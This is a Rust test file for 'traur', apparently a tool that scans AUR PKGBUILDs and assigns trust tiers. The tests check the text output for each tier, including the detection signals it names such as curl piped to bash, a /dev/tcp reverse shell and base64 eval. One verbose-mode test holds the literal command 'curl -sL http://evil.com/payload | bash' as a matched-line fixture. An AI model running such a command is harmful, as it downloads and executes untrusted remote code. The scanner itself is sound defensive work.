//! E2E tests for scan output formatting.
//!
//! Verifies the exact text output produced by `write_text` for every tier,
//! ensuring signal details are always shown regardless of tier.

use traur::shared::output;
use traur::shared::scoring::{ScanResult, Signal, SignalCategory, Tier};

fn make_signal(id: &str, category: SignalCategory, points: u32, description: &str, override_gate: bool) -> Signal {
    Signal {
        id: id.to_string(),
        category,
        points,
        description: description.to_string(),
        is_override_gate: override_gate,
        matched_line: None,
    }
}

fn make_signal_with_line(id: &str, category: SignalCategory, points: u32, description: &str, override_gate: bool, line: &str) -> Signal {
    Signal {
        id: id.to_string(),
        category,
        points,
        description: description.to_string(),
        is_override_gate: override_gate,
        matched_line: Some(line.to_string()),
    }
}

fn render(result: &ScanResult, verbose: bool) -> String {
    colored::control::set_override(false);
    let mut buf = Vec::new();
    output::write_text(&mut buf, result, verbose);
    String::from_utf8(buf).unwrap()
}

// ---------- TRUSTED ----------

#[test]
fn trusted_no_signals() {
    let result = ScanResult {
        package: "yay".to_string(),
        score: 100,
        tier: Tier::Trusted,
        signals: vec![],
        override_gate_fired: None,
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: yay (trust: 100/100)
  Trust: TRUSTED
  No negative signals found.
");
}

#[test]
fn trusted_with_signals() {
    let result = ScanResult {
        package: "eww".to_string(),
        score: 92,
        tier: Tier::Trusted,
        signals: vec![
            make_signal("M-NEW-PACKAGE", SignalCategory::Metadata, 10, "Package is less than 6 months old", false),
            make_signal("M-VOTES-LOW", SignalCategory::Metadata, 5, "Low vote count", false),
        ],
        override_gate_fired: None,
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: eww (trust: 92/100)
  Trust: TRUSTED
  Negative signals:
       M-NEW-PACKAGE: Package is less than 6 months old
       M-VOTES-LOW: Low vote count
");
}

// ---------- OK ----------

#[test]
fn ok_with_signals() {
    let result = ScanResult {
        package: "some-tool".to_string(),
        score: 70,
        tier: Tier::Ok,
        signals: vec![
            make_signal("M-NEW-PACKAGE", SignalCategory::Metadata, 15, "Package is less than 6 months old", false),
            make_signal("P-WGET-DOWNLOAD", SignalCategory::Pkgbuild, 35, "Downloads file with wget", false),
        ],
        override_gate_fired: None,
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: some-tool (trust: 70/100)
  Trust: OK
  Negative signals:
       M-NEW-PACKAGE: Package is less than 6 months old
     ! P-WGET-DOWNLOAD: Downloads file with wget
");
}

// ---------- SKETCHY ----------

#[test]
fn sketchy_with_signals() {
    let result = ScanResult {
        package: "sketchy-pkg".to_string(),
        score: 50,
        tier: Tier::Sketchy,
        signals: vec![
            make_signal("P-EVAL-BASE64", SignalCategory::Pkgbuild, 60, "Base64-encoded eval block", false),
            make_signal("M-VOTES-ZERO", SignalCategory::Metadata, 20, "Zero votes", false),
        ],
        override_gate_fired: None,
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: sketchy-pkg (trust: 50/100)
  Trust: SKETCHY
  Negative signals:
    !! P-EVAL-BASE64: Base64-encoded eval block
       M-VOTES-ZERO: Zero votes
");
}

// ---------- SUSPICIOUS ----------

#[test]
fn suspicious_with_signals() {
    let result = ScanResult {
        package: "shady-bin".to_string(),
        score: 30,
        tier: Tier::Suspicious,
        signals: vec![
            make_signal("P-SYSTEMD-CREATE", SignalCategory::Pkgbuild, 45, "Creates systemd service", false),
            make_signal("P-SYSINFO-RECON", SignalCategory::Pkgbuild, 40, "System reconnaissance commands", false),
            make_signal("B-NAME-IMPERSONATE", SignalCategory::Behavioral, 65, "Name impersonates popular package", false),
        ],
        override_gate_fired: None,
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: shady-bin (trust: 30/100)
  Trust: SUSPICIOUS
  Negative signals:
     ! P-SYSTEMD-CREATE: Creates systemd service
     ! P-SYSINFO-RECON: System reconnaissance commands
    !! B-NAME-IMPERSONATE: Name impersonates popular package
");
}

// ---------- MALICIOUS ----------

#[test]
fn malicious_with_override_gate() {
    let result = ScanResult {
        package: "evil-tool".to_string(),
        score: 5,
        tier: Tier::Malicious,
        signals: vec![
            make_signal("P-CURL-PIPE", SignalCategory::Pkgbuild, 90, "curl piped to bash", true),
            make_signal("P-RAW-IP-URL", SignalCategory::Pkgbuild, 30, "Source URL uses raw IP address", false),
        ],
        override_gate_fired: Some("P-CURL-PIPE".to_string()),
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: evil-tool (trust: 5/100)
  Trust: MALICIOUS
  !! Override gate fired: P-CURL-PIPE
  Negative signals:
    !! P-CURL-PIPE: curl piped to bash
     ! P-RAW-IP-URL: Source URL uses raw IP address
");
}

#[test]
fn malicious_no_signals_only_gate() {
    let result = ScanResult {
        package: "backdoor".to_string(),
        score: 10,
        tier: Tier::Malicious,
        signals: vec![
            make_signal("P-REVSHELL-DEVTCP", SignalCategory::Pkgbuild, 90, "Reverse shell via /dev/tcp", true),
        ],
        override_gate_fired: Some("P-REVSHELL-DEVTCP".to_string()),
    };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: backdoor (trust: 10/100)
  Trust: MALICIOUS
  !! Override gate fired: P-REVSHELL-DEVTCP
  Negative signals:
    !! P-REVSHELL-DEVTCP: Reverse shell via /dev/tcp
");
}

// ---------- Verbose mode ----------

#[test]
fn verbose_shows_matched_lines() {
    let result = ScanResult {
        package: "test-pkg".to_string(),
        score: 45,
        tier: Tier::Sketchy,
        signals: vec![
            make_signal_with_line(
                "P-CURL-PIPE", SignalCategory::Pkgbuild, 90, "curl piped to bash", true,
                "curl -sL http://evil.com/payload | bash",
            ),
            make_signal("M-VOTES-ZERO", SignalCategory::Metadata, 20, "Zero votes", false),
        ],
        override_gate_fired: Some("P-CURL-PIPE".to_string()),
    };
    let out = render(&result, true);
    assert_eq!(out, "\
traur: test-pkg (trust: 45/100)
  Trust: SKETCHY
  !! Override gate fired: P-CURL-PIPE
  Negative signals:
    !! P-CURL-PIPE: curl piped to bash
         > curl -sL http://evil.com/payload | bash
       M-VOTES-ZERO: Zero votes
");
}

#[test]
fn verbose_without_matched_line_shows_nothing_extra() {
    let result = ScanResult {
        package: "test-pkg".to_string(),
        score: 85,
        tier: Tier::Trusted,
        signals: vec![
            make_signal("M-NEW-PACKAGE", SignalCategory::Metadata, 10, "Package is less than 6 months old", false),
        ],
        override_gate_fired: None,
    };
    let verbose_out = render(&result, true);
    let normal_out = render(&result, false);
    // No matched_line means verbose and non-verbose are identical
    assert_eq!(verbose_out, normal_out);
}

// ---------- Signal prefix severity levels ----------

#[test]
fn signal_prefix_levels() {
    let result = ScanResult {
        package: "prefix-test".to_string(),
        score: 20,
        tier: Tier::Malicious,
        signals: vec![
            // override gate -> "!!" prefix
            make_signal("GATE", SignalCategory::Pkgbuild, 90, "gate signal", true),
            // points >= 60 -> "!!" prefix
            make_signal("HIGH", SignalCategory::Pkgbuild, 60, "high severity", false),
            // points >= 30 -> " !" prefix
            make_signal("MED", SignalCategory::Behavioral, 30, "medium severity", false),
            // points < 30 -> "  " prefix
            make_signal("LOW", SignalCategory::Metadata, 10, "low severity", false),
        ],
        override_gate_fired: Some("GATE".to_string()),
    };
    let out = render(&result, false);
    // Verify each prefix level
    assert!(out.contains("    !! GATE: gate signal"), "override gate should have !! prefix");
    assert!(out.contains("    !! HIGH: high severity"), "high severity should have !! prefix");
    assert!(out.contains("     ! MED: medium severity"), "medium severity should have  ! prefix");
    assert!(out.contains("       LOW: low severity"), "low severity should have    prefix");
}

// ---------- Full pipeline e2e (scan_pkgbuild -> write_text) ----------

#[test]
fn full_pipeline_trusted_shows_signals() {
    let pkgbuild = include_str!("fixtures/benign/yay.PKGBUILD");
    let result = traur::coordinator::scan_pkgbuild("yay", pkgbuild);
    let out = render(&result, false);

    // Must show package header
    assert!(out.contains("traur: yay (trust:"), "should show package header");
    assert!(out.contains("Trust: TRUSTED"), "should show TRUSTED tier");

    // If there are signals, they must be listed (not just a count)
    if !result.signals.is_empty() {
        assert!(out.contains("Negative signals:"), "signals must be listed, not just counted");
        for signal in &result.signals {
            assert!(out.contains(&signal.id), "signal {} must appear in output", signal.id);
            assert!(out.contains(&signal.description), "signal description must appear");
        }
    } else {
        assert!(out.contains("No negative signals found."));
    }
}

#[test]
fn full_pipeline_malicious_shows_all_signals() {
    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
    let result = traur::coordinator::scan_pkgbuild("firefox-fix-bin", pkgbuild);
    let out = render(&result, false);

    assert!(out.contains("Trust: MALICIOUS"), "should show MALICIOUS tier");
    assert!(out.contains("Override gate fired:"), "should show override gate");
    assert!(out.contains("Negative signals:"), "signals must be listed");

    // Every signal must appear in output
    for signal in &result.signals {
        assert!(out.contains(&signal.id), "signal {} must appear in output", signal.id);
    }
}
